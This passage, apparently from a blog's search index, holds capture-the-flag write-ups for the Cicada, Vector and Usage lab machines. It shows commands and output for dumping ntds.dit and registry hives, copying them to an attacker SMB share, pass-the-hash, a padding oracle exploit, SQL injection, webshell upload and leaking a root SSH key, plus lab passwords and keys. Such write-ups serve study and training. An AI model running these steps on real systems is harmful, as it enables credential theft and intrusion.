script's actions will be displayed more clearly. 2. **set metadata C:\\Windows\\Temp\\meta.cab**: The script saves metadata (information about the shadow copy) to a file called `meta.cab` in the `C:\\Windows\\Temp` directory.3. **set context clientaccessible**: This makes the shadow copy accessible to clients (i.e., it can be used for backup purposes by applications).4. **set context persistent**: This keeps the shadow copy persistent, meaning it wonâ€™t be automatically deleted after use.5. **begin backup**: Marks the start of the backup process.6. **add volume C: alias cdrive**: Adds the `C:` drive to the backup and assigns it the alias `cdrive`.7. **create**: Creates the shadow copy for the specified volume (in this case, the `C:` drive).8. **expose %cdrive% E:**: Exposes (mounts) the shadow copy of the `C:` drive as a new drive letter `E:`.9. **end backup**: Marks the end of the backup process.>In summary, this script creates a shadow copy of the `C:` drive and mounts it to the `E:` drive, making it accessible for further operations.{: .prompt-tip }Now lets run diskshadow command with this script ðŸ”»```powershell*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Videos> diskshadow /s back_script.txtMicrosoft DiskShadow version 1.0Copyright (C) 2013 Microsoft CorporationOn computer: CICADA-DC, 10/9/2024 10:46:44 AM-> set verbose on-> set metadata C:\\Windows\\Temp\\meta.cabThe existing file will be overwritten.-> set context clientaccessible-> set context persistent-> begin backup-> add volume C: alias cdrive-> createComponent \"\\BCD\\BCD\" from writer \"ASR Writer\" is excluded from backup,because it requires volume which is not in the shadow copy set.The writer \"ASR Writer\" is now entirely excluded from the backup because the top-levelnon selectable component \"\\BCD\\BCD\" is excluded.* Including writer \"Task Scheduler Writer\":\t+ Adding component: \\TasksStore* Including writer \"VSS Metadata Store Writer\":\t+ Adding component: \\WriterMetadataStore* Including writer \"Performance Counters Writer\":\t+ Adding component: \\PerformanceCounters* Including writer \"System Writer\":\t+ Adding component: \\System Files\t+ Adding component: \\Win32 Services Files* Including writer \"WMI Writer\":\t+ Adding component: \\WMI* Including writer \"DFS Replication service writer\":\t+ Adding component: \\SYSVOL\\760C4715-6766-4D86-B0E5-4668258AC503-E68080D4-A0B8-4ED9-AB8A-A7FFD4F0BA03* Including writer \"Registry Writer\":\t+ Adding component: \\Registry* Including writer \"COM+ REGDB Writer\":\t+ Adding component: \\COM+ REGDB* Including writer \"NTDS\":\t+ Adding component: \\C:_Windows_NTDS\\ntdsAlias cdrive for shadow ID {c63d2ce7-8a1a-4729-baab-3742d97c847c} set as environment variable.Alias VSS_SHADOW_SET for shadow set ID {92c97921-831e-4000-a85a-d8568a6d48c9} set as environment variable.Inserted file Manifest.xml into .cab file meta.cabInserted file BCDocument.xml into .cab file meta.cabInserted file WM0.xml into .cab file meta.cabInserted file WM1.xml into .cab file meta.cabInserted file WM2.xml into .cab file meta.cabInserted file WM3.xml into .cab file meta.cabInserted file WM4.xml into .cab file meta.cabInserted file WM5.xml into .cab file meta.cabInserted file WM6.xml into .cab file meta.cabInserted file WM7.xml into .cab file meta.cabInserted file WM8.xml into .cab file meta.cabInserted file WM9.xml into .cab file meta.cabInserted file DisC9E5.tmp into .cab file meta.cabQuerying all shadow copies with the shadow copy set ID {92c97921-831e-4000-a85a-d8568a6d48c9}\t* Shadow copy ID = {c63d2ce7-8a1a-4729-baab-3742d97c847c}\t\t%cdrive%\t\t- Shadow copy set: {92c97921-831e-4000-a85a-d8568a6d48c9}\t%VSS_SHADOW_SET%\t\t- Original count of shadow copies = 1\t\t- Original volume name: \\\\?\\Volume{fcebaf9b-0000-0000-0000-500600000000}\\ [C:\\]\t\t- Creation time: 10/9/2024 10:46:56 AM\t\t- Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\t\t- Originating machine: CICADA-DC.cicada.htb\t\t- Service machine: CICADA-DC.cicada.htb\t\t- Not exposed\t\t- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}\t\t- Attributes: No_Auto_Release Persistent DifferentialNumber of shadow copies listed: 1-> expose %cdrive% E:-> %cdrive% = {c63d2ce7-8a1a-4729-baab-3742d97c847c}The drive letter is already in use.Note: END BACKUP was not commanded, writers not notified BackupComplete.DiskShadow is exiting.```Now lets again try to copy the `ntds.dit` file but with robocopy Tool, That basically work as copy command only but more forcefully.```bash*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Videos> robocopy /b E:\\Windows\\ntds . ntds.dit------------------------------------------------------------------------------- ROBOCOPY :: Robust File Copy for Windows------------------------------------------------------------------------------- Started : Wednesday, October 9, 2024 10:47:20 AM Source : E:\\Windows\\ntds\\ Dest : C:\\Users\\emily.oscars.CICADA\\Videos\\ Files : ntds.dit Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30------------------------------------------------------------------------------\t 1\tE:\\Windows\\ntds\\\t New File \t\t 16.0 m\tntds.dit 0.0% 0.3% 0.7% 1.1% 1.5% 1.9% 2.3% 2.7% 3.1% 3.5%[...snip...]98.8% 99.2% 99.6%100%100%------------------------------------------------------------------------------ Total Copied Skipped Mismatch FAILED Extras Dirs : 1 0 1 0 0 0 Files : 1 1 0 0 0 0 Bytes : 16.00 m 16.00 m 0 0 0 0 Times : 0:00:00 0:00:00 0:00:00 0:00:00 Speed : 56,488,942 Bytes/sec. Speed : 3,232.323 MegaBytes/min. Ended : Wednesday, October 9, 2024 10:47:21 AM```Lets again try it with the `Copy-FileSeBackupPrivilege` method that I imported earlier through SeBackupPrivilegeCmdLets.dll, SeBackupPrivilegeUtils.dll dlls.```*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Videos> Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Videos> ls C:\\Temp Directory: C:\\TempMode LastWriteTime Length Name---- ------------- ------ -----a---- 10/10/2024 5:25 AM 16777216 ntds.dit```Now it works like magic ðŸ¤£.Let also access `system` file ðŸ”»```powershell*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Videos> reg save hklm\\system c:\\temp\\systemThe operation completed successfully.*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Videos> ls C:\\Temp Directory: C:\\TempMode LastWriteTime Length Name---- ------------- ------ -----a---- 10/10/2024 5:25 AM 16777216 ntds.dit-a---- 10/10/2024 5:28 AM 18518016 system```Lets access these files now, But how ? with SMB server like this ðŸ”»**Attacker Machine** ðŸ”»```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Cicada]â””â”€$ impacket-smbserver share . -smb2support -username emily.oscars -password ''Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Incoming connection (10.10.11.35,52576)```**Victim Machine** ðŸ”»```powershell*Evil-WinRM* PS C:\\TEMp> net use m: \\\\10.10.16.32\\share /user:emily.oscars 'Q!3@Lp#M6b*7t*Vt'The command completed successfully.*Evil-WinRM* PS C:\\TEMp> copy system m:\\*Evil-WinRM* PS C:\\TEMp> copy ntds.dit m:\\ntds```As I got these 2 files ntds.dit and system file on my attacker machine so lets dump the hashes with secretsdump tool from impacket.```bashimpacket-secretsdump -system system -ntds ntds.dit Local```![](Pasted%20image%2020241010110505.png)_Secretsdump Tool from impacket module_### Pass The Hash (PtH)ðŸ”»```powershellâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Cicada]â””â”€$ evil-winrm -i 10.10.11.35 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\Administrator> whoamicicada\\administrator*Evil-WinRM* PS C:\\Users\\Administrator> hostnameCICADA-DC*Evil-WinRM* PS C:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is 1B60-8905C:.+---3D Objects+---Contacts+---Desktop| root.txt|+---Documents| \\---WindowsPowerShell| \\---Scripts| \\---InstalledScriptInfos+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\Administrator> cat Desktop\\root.txt62a8e68f106b779f769ac47e48a1c5b5*Evil-WinRM* PS C:\\Users\\Administrator> ipconfigWindows IP ConfigurationEthernet adapter Ethernet0: Connection-specific DNS Suffix . : IPv6 Address. . . . . . . . . . . : dead:beef::754b:9045:f7e8:966f Link-local IPv6 Address . . . . . : fe80::787b:ea5b:a66a:aac%6 IPv4 Address. . . . . . . . . . . : 10.10.11.35 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:53c1%6 10.10.10.2*Evil-WinRM* PS C:\\Users\\Administrator> ```> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Vector", "url": "/posts/Vector/", "categories": "Proving Grounds, Practice", "tags": "Public Exploit, PrivEsc, Windows, RDP, Padding_Oracle_Attack, cryptography", "date": "2024-09-03 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Vector]â””â”€$ sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Results.txt -Pn 192.168.155.119Nmap scan report for 192.168.155.1...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Vector]â””â”€$ sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Results.txt -Pn 192.168.155.119Nmap scan report for 192.168.155.119Host is up, received user-set (0.093s latency).Scanned at 2024-07-01 08:39:41 IST for 160sNot shown: 65527 filtered tcp ports (no-response)PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack ttl 125 Microsoft ftpd| ftp-syst: |_ SYST: Windows_NT80/tcp open http syn-ack ttl 125 Microsoft IIS httpd 10.0| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Site doesnt have a title (text/html; charset=utf-8).135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn445/tcp open microsoft-ds syn-ack ttl 125 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds2290/tcp open http syn-ack ttl 125 Microsoft IIS httpd 10.0|_http-title: Site doesnt have a title (text/html; charset=utf-8).| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.03389/tcp open ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services|_ssl-date: 2024-07-01T03:12:20+00:00; 0s from scanner time.| rdp-ntlm-info: | Target_Name: VECTOR| NetBIOS_Domain_Name: VECTOR| NetBIOS_Computer_Name: VECTOR| DNS_Domain_Name: vector| DNS_Computer_Name: vector| Product_Version: 10.0.17763|_ System_Time: 2024-07-01T03:11:40+00:00| ssl-cert: Subject: commonName=vector| Issuer: commonName=vector| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-03-22T16:36:29| Not valid after: 2024-09-21T16:36:29| MD5: 3a68:bca7:93da:d9d9:0748:1a1d:b6a1:9e0c| SHA-1: 5ae7:a6d8:afd7:50a4:e1bf:d7b6:21c7:23b9:7aac:a79a| -----BEGIN CERTIFICATE-----| MIIC0DCCAbigAwIBAgIQV3xP7PEZnK1OsuzHBkam8TANBgkqhkiG9w0BAQsFADAR| MQ8wDQYDVQQDEwZ2ZWN0b3IwHhcNMjQwMzIyMTYzNjI5WhcNMjQwOTIxMTYzNjI5| WjARMQ8wDQYDVQQDEwZ2ZWN0b3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK| AoIBAQDGdPie+1SGnkr6ZU78dpEEWL5oHKrXOGPLy18cTze1sFVbaI5/VOZMVkZv| k8WGIuuKtqe+B8P2I7p5YdpN06CUnEtLGHik2h9vsiXpWShLMrzt5wkSbr9mJ7HT| UunqmHwYx+d83y/BIdh+VHnXQyLS6OG2xLhiTM8LJVUvPnU+RJwPSYlRj7QL/y4Y| JcuLkj/81wRINh5lErAWMBeSiKna5C/54dwhlfsM5pTGAZGetoUW+bArV6wvXlcQ| pDj5yZSpEoiA/kZW0zTUuupNmQnoB7erBQcDk9foQJozHkRTp3C1dkHncBDjltYo| f3fwSNtAKF3bH0nT1t9nRezBywQtAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEADAuVG4npJs4vv/ww| e0MJ3hkFI+1hR9k0u+jnEt3cCMuDp5zarsnWIsn0KCvGXlSl64+4pOuKEH0/XrJm| ShK+5F6tBIyLyV2ZsZ1OjxtJ6y5DRq6Qp9BLTVZvEfVbEsiRcBD6Y3yL4WbjfMfu| m1KejISkCPTDi9l+4q6Oi8VQBmElJxkZBzpKnbTyZK/QYohT5HdfpWDywmeSOOSM| r6tlkV9wKa6IdloPhhEaL017MaMCR4ucraeew+dfH8yhww6LbCZwY6rVKlWgQdEo| 7ZgbPA6/QYu06GAIYcJkRTy6DxdcMu2KVjLIR2M34FEUDsGQXFL6jqnXBfbByuNA| utpBTw==|_-----END CERTIFICATE-----5985/tcp open http syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not FoundService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 0s, deviation: 0s, median: 0s| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 8058/tcp): CLEAN (Timeout)| Check 2 (port 11018/tcp): CLEAN (Timeout)| Check 3 (port 63046/udp): CLEAN (Timeout)| Check 4 (port 31163/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-time: | date: 2024-07-01T03:11:42|_ start_date: N/A| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)```{: .nolineno}## Web Enumeration â¤µï¸I checked port 2290 and I found this page indicating a missing parameter ðŸ”»![Image](Pasted%20image%2020240701093356.png)_Specifies me about c parameter_While giving the parameter I got this 0 value so I checked its source code ðŸ”»![Image](Pasted%20image%2020240701093457.png)_While using c parameter I get 0 as default value_![Image](Pasted%20image%2020240701093514.png)_Source code of this page_Now I am dealing with AES-256-CBC-PKCS7 cryptography so I need to research further as I searched related to its exploit I got this vulnerability highlighted ðŸ”»![Image](Pasted%20image%2020240701093722.png)_AES-256-CBC-PKCS7 key is related to Oracle Attack_I found this link interestingly to extract the value out of this cypher text.### Padding Oracle AttackIf you have an cyphertext (encrypted text) using AES-256-CBC-PKCS7 (or DES) and an oracle you can run this attack. Lots more details here: [https://github.com/mpgn/Padding-oracle-attack](https://github.com/mpgn/Padding-oracle-attack)```bashpython3 exploit.py -c '4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488' -l '8' --host target.ip:2290 -u '/?c=' -v --error '0'```{: .nolineno}Another example site ðŸ”»https://github.com/halloweeks/AES-256-CBC```bashpython3 exploit.py -c 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488 -l 16 --host 192.168.155.119:2290 -u /?c= -v --error '0'```{: .nolineno}![Image](Pasted%20image%2020240701090600.png)![Image](Pasted%20image%2020240701090450.png)_Exploit gives me the decrypted password from that AES key_I got the password now so lets see what it can perform ðŸ”»![Image](Pasted%20image%2020240701094024.png)_Got connection with victor creds, and checked through netexec Tool_I connected the rdp connection with remmina Tool.![Image](Pasted%20image%2020240701094125.png)_RDP connection using remmina Tool_To copy this `rar` file to the attacker machine I used `smb` server ðŸ”»![Image](Pasted%20image%2020240701093030.png)_Sharing of files using impacket-smbshare Tool_On Attacker Machine ðŸ”»![Image](Pasted%20image%2020240701093212.png)_Coping file to the sharing location_I got the copied file on my attacker machine so lets extract it ðŸ”»![Image](Pasted%20image%2020240701092749.png)_Extract the rar file without password_It requires a password .![Image](Pasted%20image%2020240701092710.png)_Extracted the rar file with password_I used the password of victor to decrypt this rar file .```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Vector]â””â”€$ cat backup.txt QWRtaW5pc3RyYXRvcjpFdmVyeXdh........hcDM3NQ== â”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Vector]â””â”€$ echo QWRtaW5pc3RyYXRvcjpFdmVyeXdheUxhYmVsV3JhcDM3NQ== | base64 -dAdministrator: ```{: .nolineno}![Image](Pasted%20image%2020240701092829.png)_netexec Tool connection on winrm service_```powershellâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Vector]â””â”€$ evil-winrm -i 192.168.155.119 -u Administrator -p '' Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cd ..t*Evil-WinRM* PS C:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is 7ADA-B29FC:.| stop|+---3D Objects+---Contacts+---Desktop| proof.txt|+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\Administrator> cat Desktop\\proof.txt28ccdd3a848dd67f089e494a55149940*Evil-WinRM* PS C:\\Users\\Administrator> ```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Usage", "url": "/posts/Usage/", "categories": "HackTheBox", "tags": "SQLi, RFI, PrivEsc, recon, 7z", "date": "2024-09-03 00:00:00 +0530", "snippet": "| Machine Link | https://app.hackthebox.com/machines/Usage || ------------------ | -------------------------------------------------- || Operating System | Windows ...", "content": "| Machine Link | https://app.hackthebox.com/machines/Usage || ------------------ | -------------------------------------------------- || Operating System | Windows || Difficulty | Easy || Machine Created by | [rajHere](https://app.hackthebox.com/users/396413) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Usage]â””â”€$ sudo nmap -sC -sV -T4 -oN Nmap_Results.txt -Pn 10.10.11.18Nmap scan report for 10.10.11.18Host is up (1.5s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)|_ 256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://usage.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 which redirected me to a domain name called `usage.htb` and after I set the host file I found this login page with does not indicate any kind of injections while login.![Image](Pasted%20image%2020240812143830.png)Now lets register a user with a random email and a password.![Image](Pasted%20image%2020240812143705.png)I also checked the admin site As I was not able to access that site due to the subdomain name so I set the host file as `admin.usage.htb` and I got another login page like this.![Image](Pasted%20image%2020240812143723.png)After login with that registred creds I got this note usefull page.![Image](Pasted%20image%2020240812143630.png)After that I enumerated further and encontered this forgot password page and I tried to enter the registed user email ID and it worked rather than any random not registered ID.![Image](Pasted%20image%2020240812142905.png)Now while checking for SQLi in this field I used single quote at the end to the email address and send the request and turns out it gives me 500 server server error .![Image](Pasted%20image%2020240812142933.png)For Another check I also included the comment dubble dash (--) along with single dash (-) so that if it is SQLi it will consider this as comment and move on ,That means it should not give me the error now If I forword this request like this : `admin@usage.htb'-- -`![Image](Pasted%20image%2020240812143439.png)As as expected , I did not get an error, So I will be using sqlmap to deal with this SQLi vulnerability.```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Usage]â””â”€$ sqlmap -r forget.req -p email --technique=BUT --level=5 --risk=3 -D usage_blog --dump --thread=10 -batch ```{: .nolineno}![Image](Pasted%20image%2020240812153233.png)I found usage_blog Database and I got this data from this admin_users Table.![Image](Pasted%20image%2020240812212320.png)| id | name | avatar | password | username | created_at | updated_at | remember_token || --- | ------------- | ------- | -------------------------------------------------------------- | -------- | ------------------- | ------------------- | -------------------------------------------------------------- || 1 | Administrator | | `$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2` | admin | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | `kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT` |I cracked the password with John The Ripper Tool.```bashjohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt```{: .nolineno}![Image](Pasted%20image%2020240812212756.png)```{: .nolineno}admin : whatever1```{: .nolineno}Lets login into the admin site with this above creds ðŸ”»![Image](Pasted%20image%2020240812213026.png)Lets upload a reverse shell or webshell to take control.![Image](Pasted%20image%2020240812213127.png)I got RFI which leads me to upload a command shell and I got it like this ðŸ”»![Image](Pasted%20image%2020240812215506.png)I made these changes to an image to make it into a command shell ðŸ”»![Image](Pasted%20image%2020240812215408.png)Lets have a shell now ðŸ”»![Image](Pasted%20image%2020240812220812.png)While enumerating I got a password from a environment file `.env` ðŸ”»![Image](Pasted%20image%2020240812221126.png)```bashs3cr3t_c0d3d_1uth```{: .nolineno}Inside the home directory of dash user I got this `.monitrc` file so I opened and and got a new password ðŸ”»```bashdash@usage:~$ cat .monitrccat .monitrc#Monitoring Interval in Secondsset daemon 60#Enable Web Accessset httpd port 2812 use address 127.0.0.1 allow admin:3nc0d3d_pa$$w0rd#Apachecheck process apache with pidfile \"/var/run/apache2/apache2.pid\" if cpu > 80% for 2 cycles then alert#System Monitoring check system usage if memory usage > 80% for 2 cycles then alert if cpu usage (user) > 70% for 2 cycles then alert if cpu usage (system) > 30% then alert if cpu usage (wait) > 20% then alert if loadavg (1min) > 6 for 2 cycles then alert if loadavg (5min) > 4 for 2 cycles then alert if swap usage > 5% then alertcheck filesystem rootfs with path / if space usage > 80% then alertdash@usage:~$ ```{: .nolineno}I used this above mentioned password on another user of this system as xander and I got its shell access with that ðŸ”»```bashdash@usage:~$ su xandersu xanderPassword: 3nc0d3d_pa$$w0rdxander@usage:/home/dash$ whoamiwhoamixanderxander@usage:/home/dash$ ididuid=1001(xander) gid=1001(xander) groups=1001(xander)xander@usage:/home/dash$ cd ~cd ~xander@usage:~$ ls -alls -altotal 24drwxr-x--- 4 xander xander 4096 Apr 2 20:25 .drwxr-xr-x 4 root root 4096 Aug 16 2023 ..lrwxrwxrwx 1 xander xander 9 Apr 2 20:25 .bash_history -> /dev/null-rw-r--r-- 1 xander xander 3771 Jan 6 2022 .bashrcdrwx------ 3 xander xander 4096 Aug 20 2023 .config-rw-r--r-- 1 xander xander 807 Jan 6 2022 .profiledrwx------ 2 xander xander 4096 Apr 8 13:17 .sshxander@usage:~$ sudo -lsudo -lMatching Defaults entries for xander on usage: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser xander may run the following commands on usage: (ALL : ALL) NOPASSWD: /usr/bin/usage_managementxander@usage:~$```{: .nolineno}![Image](Pasted%20image%2020240812222925.png)I used this wildcard space trick method from [hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z) ðŸ”»I followed the path and accessed the private key of root user like this ðŸ”»```bashxander@usage:/var/www/html$ touch @root.txttouch @root.txtxander@usage:/var/www/html$ touch @id_rsatouch @id_rsaxander@usage:/var/www/html$ ls -alls -altotal 16drwxrwxrwx 4 root xander 4096 Aug 12 17:07 .drwxr-xr-x 3 root root 4096 Apr 2 21:15 ..-rw-rw-r-- 1 xander xander 0 Aug 12 17:07 @id_rsalrwxrwxrwx 1 xander xander 17 Aug 12 17:03 id_rsa -> /root/.ssh/id_rsadrwxrwxr-x 13 dash dash 4096 Apr 2 21:15 project_admin-rw-rw-r-- 1 xander xander 0 Aug 12 17:07 @root.txtlrwxrwxrwx 1 xander xander 14 Aug 12 17:00 root.txt -> /root/root.txtdrwxrwxr-x 12 dash dash 4096 Apr 2 21:15 usage_blogxander@usage:/var/www/html$```{: .nolineno}```bashxander@usage:/var/www/html$ sudo /usr/bin/usage_managementsudo /usr/bin/usage_managementChoose an option:1. Project Backup2. Backup MySQL data3. Reset admin passwordEnter your choice (1/2/3): 117-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7513 32-Core Processor (A00F11),ASM,AES-NI)Open archive: /var/backups/project.zip-- Path = /var/backups/project.zipType = zipPhysical Size = 54978799Scanning the drive: WARNING: No more files-----BEGIN OPENSSH PRIVATE KEY-----WARNING: No more filesb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWWARNING: No more filesQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8MiWARNING: No more filesQgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QWARNING: No more filesAAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDsWARNING: No more filesH2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=WARNING: No more files-----END OPENSSH PRIVATE KEY-----WARNING: No more files19108ad4b2645046b4286284aa0c2e7a2984 folders, 18210 files, 113937539 bytes (109 MiB) Updating archive: /var/backups/project.zipItems to compress: 21194 Files read from disk: 18210Archive size: 54979640 bytes (53 MiB)Scan WARNINGS for files and folders:-----BEGIN OPENSSH PRIVATE KEY----- : No more filesb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more filesQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more filesQgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more filesAAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more filesH2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files-----END OPENSSH PRIVATE KEY----- : No more files19108ad4b2645046b4286284aa0c2e7a : No more files----------------Scan WARNINGS: 8xander@usage:/var/www/html$ ```{: .nolineno}```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Usage]â””â”€$ ssh root@usage.htb -i id_rsaWelcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Mon Apr 8 01:17:46 PM UTC 2024 System load: 1.9072265625 Usage of /: 64.8% of 6.53GB Memory usage: 18% Swap usage: 0% Processes: 254 Users logged in: 0 IPv4 address for eth0: 10.10.11.18 IPv6 address for eth0: dead:beef::250:56ff:feb9:5616Expanded Security Maintenance for Applications is not enabled.0 updates can be applied immediately.Enable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Mon Apr 8 13:17:47 2024 from 10.10.14.40root@usage:~# whoamirootroot@usage:~# iduid=0(root) gid=0(root) groups=0(root)root@usage:~# ls -altotal 44drwx------ 7 root root 4096 Aug 12 16:21 .drwxr-xr-x 19 root root 4096 Apr 2 21:15 ..lrwxrwxrwx 1 root root 9 Apr 2 20:22 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Oct 15 2021 .bashrcdrwxr-xr-x 3 root root 4096 Aug 24 2023 .cache-rwxr-xr-x 1 root root 307 Apr 3 13:24 cleanup.shdrwxr-xr-x 4 root root 4096 Aug 22 2023 .configdrwxr-xr-x 3 root root 4096 Aug 21 2023 .locallrwxrwxrwx 1 root root 9 Apr 2 20:22 .mysql_history -> /dev/null-rw-r----- 1 root root 33 Aug 12 16:21 root.txtdrwx------ 3 root root 4096 Aug 6 2023 snapdrwx------ 2 root root 4096 Apr 2 23:07 .ssh-rw-r--r-- 1 root root 1444 Oct 28 2023 usage_management.croot@usage:~# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 